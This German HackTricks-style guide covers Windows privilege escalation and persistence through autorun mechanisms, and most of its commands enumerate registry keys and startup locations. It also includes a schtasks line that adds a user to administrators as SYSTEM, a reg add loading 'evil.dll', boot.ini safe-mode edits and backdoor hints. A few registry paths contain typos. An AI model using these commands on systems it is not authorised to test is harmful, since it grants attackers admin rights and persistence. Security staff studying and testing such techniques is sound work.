# Privilege Escalation mit Autorun-Programmen

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** für **Intigriti**, eine Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie uns bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) heute bei und beginnen Sie, Prämien von bis zu **100.000 $** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic** kann verwendet werden, um Programme beim **Start** auszuführen. Sehen Sie, welche Binärdateien programmiert sind, um beim Start ausgeführt zu werden:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Geplante Aufgaben

**Aufgaben** können mit **bestimmter Häufigkeit** geplant werden. Überprüfen Sie, welche Binärdateien geplant sind, um ausgeführt zu werden:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Ordner

Alle Binärdateien, die sich in den **Startordnern befinden, werden beim Start ausgeführt**. Die gängigen Startordner sind die unten aufgeführten, aber der Startordner ist im Registrierungseintrag angegeben. [Lesen Sie hier, um herauszufinden, wo.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registrierung

{% hint style="info" %}
[Hinweis von hier](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Der Registrierungseintrag **Wow6432Node** zeigt an, dass Sie eine 64-Bit-Windows-Version ausführen. Das Betriebssystem verwendet diesen Schlüssel, um eine separate Ansicht von HKEY_LOCAL_MACHINE\SOFTWARE für 32-Bit-Anwendungen anzuzeigen, die auf 64-Bit-Windows-Versionen ausgeführt werden.
{% endhint %}

### Ausführungen

**Allgemein bekannte** AutoRun-Registrierung:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registrierungsschlüssel, die als **Run** und **RunOnce** bekannt sind, sind so konzipiert, dass sie Programme automatisch jedes Mal ausführen, wenn sich ein Benutzer am System anmeldet. Die Befehlszeile, die als Datenwert eines Schlüssels zugewiesen ist, ist auf 260 Zeichen oder weniger begrenzt.

**Serviceausführungen** (können den automatischen Start von Diensten beim Booten steuern):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Auf Windows Vista und späteren Versionen werden die Registrierungsschlüssel **Run** und **RunOnce** nicht automatisch generiert. Einträge in diesen Schlüsseln können entweder Programme direkt starten oder sie als Abhängigkeiten angeben. Um beispielsweise eine DLL-Datei beim Anmelden zu laden, könnte man den Registrierungseintrag **RunOnceEx** zusammen mit einem "Depend"-Schlüssel verwenden. Dies wird durch das Hinzufügen eines Registrierungseintrags demonstriert, um "C:\temp\evil.dll" während des Systemstarts auszuführen:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Exploit 1**: Wenn Sie in einem der genannten Registrierungseinträge innerhalb von **HKLM** schreiben können, können Sie Berechtigungen eskalieren, wenn sich ein anderer Benutzer anmeldet.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: Wenn Sie eine der Binärdateien in einem der Registrierungseinträge innerhalb von **HKLM** überschreiben können, können Sie diese Binärdatei mit einem Backdoor modifizieren, wenn sich ein anderer Benutzer anmeldet, und Berechtigungen eskalieren.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startpfad

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Verknüpfungen im **Startup**-Ordner lösen automatisch Dienste oder Anwendungen aus, die während der Benutzeranmeldung oder des Systemneustarts gestartet werden. Der Speicherort des **Startup**-Ordners ist in der Registrierung für die Bereiche **Lokale Maschine** und **Aktueller Benutzer** definiert. Dies bedeutet, dass jede Verknüpfung, die zu diesen spezifizierten **Startup**-Speicherorten hinzugefügt wird, sicherstellt, dass der verknüpfte Dienst oder das Programm nach dem Anmelde- oder Neustartvorgang gestartet wird. Dies ist eine einfache Methode, um Programme automatisch zu planen.

{% hint style="info" %}
Wenn Sie einen beliebigen \[Benutzer] Shell-Ordner unter **HKLM** überschreiben können, können Sie ihn auf einen von Ihnen kontrollierten Ordner verweisen und eine Hintertür platzieren, die jedes Mal ausgeführt wird, wenn sich ein Benutzer am System anmeldet und Berechtigungen eskaliert.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon-Schlüssel

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Normalerweise ist der **Userinit**-Schlüssel auf **userinit.exe** eingestellt. Wenn dieser Schlüssel jedoch geändert wird, wird das angegebene ausführbare Programm auch von **Winlogon** beim Benutzeranmeldung gestartet. Ebenso soll der **Shell**-Schlüssel auf **explorer.exe** verweisen, was die Standardshell für Windows ist.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
Wenn Sie den Registrierungswert oder die ausführbare Datei überschreiben können, können Sie Berechtigungen eskalieren.
{% endhint %}

### Richtlinieneinstellungen

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Überprüfen Sie den **Run**-Schlüssel.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Ändern des abgesicherten Modus mit Eingabeaufforderung

Im Windows-Registrierungsschlüssel unter `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` ist standardmäßig ein Wert namens **`AlternateShell`** auf `cmd.exe` festgelegt. Dies bedeutet, dass bei der Auswahl von "Abgesicherter Modus mit Eingabeaufforderung" beim Start (durch Drücken von F8) `cmd.exe` verwendet wird. Es ist jedoch möglich, Ihren Computer so einzurichten, dass er automatisch in diesem Modus startet, ohne F8 drücken und ihn manuell auswählen zu müssen.

Schritte zum Erstellen einer Startoption zum automatischen Starten im "Abgesicherten Modus mit Eingabeaufforderung":

1. Ändern Sie die Attribute der Datei `boot.ini`, um die Schreibgeschützt-, System- und Versteckt-Flags zu entfernen: `attrib c:\boot.ini -r -s -h`
2. Öffnen Sie `boot.ini` zum Bearbeiten.
3. Fügen Sie eine Zeile wie diese ein: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Speichern Sie die Änderungen an `boot.ini`.
5. Wenden Sie die ursprünglichen Dateiattribute erneut an: `attrib c:\boot.ini +r +s +h`

* **Exploit 1:** Das Ändern des Registrierungsschlüssels **AlternateShell** ermöglicht die Einrichtung einer benutzerdefinierten Befehlsshell, möglicherweise für unbefugten Zugriff.
* **Exploit 2 (Schreibberechtigungen für den PATH):** Schreibberechtigungen für einen Teil der System **PATH**-Variablen, insbesondere vor `C:\Windows\system32`, ermöglichen die Ausführung einer benutzerdefinierten `cmd.exe`, die eine Hintertür sein könnte, wenn das System im abgesicherten Modus gestartet wird.
* **Exploit 3 (Schreibberechtigungen für PATH und boot.ini):** Schreibzugriff auf `boot.ini` ermöglicht einen automatischen Start im abgesicherten Modus und erleichtert unbefugten Zugriff beim nächsten Neustart.

Um die aktuelle Einstellung von **AlternateShell** zu überprüfen, verwenden Sie diese Befehle:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installiertes Komponente

Active Setup ist eine Funktion in Windows, die **initiiert, bevor die Desktop-Umgebung vollständig geladen ist**. Es priorisiert die Ausführung bestimmter Befehle, die abgeschlossen sein müssen, bevor der Benutzer-Login fortgesetzt wird. Dieser Prozess findet sogar vor anderen Starteinträgen statt, wie diejenigen in den Registrierungsabschnitten Run oder RunOnce ausgelöst werden.

Active Setup wird über die folgenden Registrierungsschlüssel verwaltet:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

In diesen Schlüsseln existieren verschiedene Unterkeys, die jeweils einer spezifischen Komponente entsprechen. Schlüsselwerte von besonderem Interesse sind:

- **IsInstalled:**
  - `0` zeigt an, dass der Befehl der Komponente nicht ausgeführt wird.
  - `1` bedeutet, dass der Befehl einmal für jeden Benutzer ausgeführt wird, was das Standardverhalten ist, wenn der Wert `IsInstalled` fehlt.
- **StubPath:** Definiert den Befehl, der von Active Setup ausgeführt werden soll. Es kann sich um eine beliebige gültige Befehlszeile handeln, wie das Starten von `notepad`.

**Sicherheitseinblicke:**

- Das Ändern oder Schreiben eines Schlüssels, bei dem **`IsInstalled`** auf `"1"` gesetzt ist, mit einem spezifischen **`StubPath`**, kann zu nicht autorisierter Befehlsausführung führen, potenziell für Privilegieneskalation.
- Das Ändern der Binärdatei, auf die in einem **`StubPath`**-Wert verwiesen wird, könnte ebenfalls zu Privilegieneskalation führen, sofern ausreichende Berechtigungen vorliegen.

Um die **`StubPath`**-Konfigurationen über Active Setup-Komponenten zu überprüfen, können diese Befehle verwendet werden:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Übersicht über Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) sind DLL-Module, die Microsofts Internet Explorer zusätzliche Funktionen hinzufügen. Sie laden sich bei jedem Start in den Internet Explorer und Windows Explorer. Ihre Ausführung kann jedoch durch Festlegen des **NoExplorer**-Schlüssels auf 1 blockiert werden, was sie daran hindert, mit Windows Explorer-Instanzen geladen zu werden.

BHOs sind mit Windows 10 über Internet Explorer 11 kompatibel, werden jedoch nicht von Microsoft Edge unterstützt, dem Standardbrowser in neueren Windows-Versionen.

Um die auf einem System registrierten BHOs zu erkunden, können Sie die folgenden Registrierungsschlüssel überprüfen:

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Jedes BHO wird durch seine **CLSID** in der Registrierung repräsentiert, die als eindeutiger Bezeichner dient. Detaillierte Informationen zu jeder CLSID finden Sie unter `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Für die Abfrage von BHOs in der Registrierung können folgende Befehle genutzt werden:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Erweiterungen

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Beachten Sie, dass im Registrierungsschlüssel für jede DLL ein neuer Registrierungseintrag vorhanden ist, der durch die **CLSID** repräsentiert wird. Die CLSID-Informationen finden Sie unter `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Schriftartentreiber

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Öffnen Sie den Befehl

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Bildausführungsoptionen
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Beachten Sie, dass alle Websites, auf denen Sie Autoruns finden können, bereits von [winpeas.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) durchsucht wurden. Für eine umfassendere Liste der automatisch ausgeführten Dateien können Sie [Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) von Sysinternals verwenden:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Mehr

**Finden Sie weitere Autoruns wie Registrierungen unter** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

## Referenzen

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie uns noch heute bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und beginnen Sie, Prämien von bis zu **$100.000** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
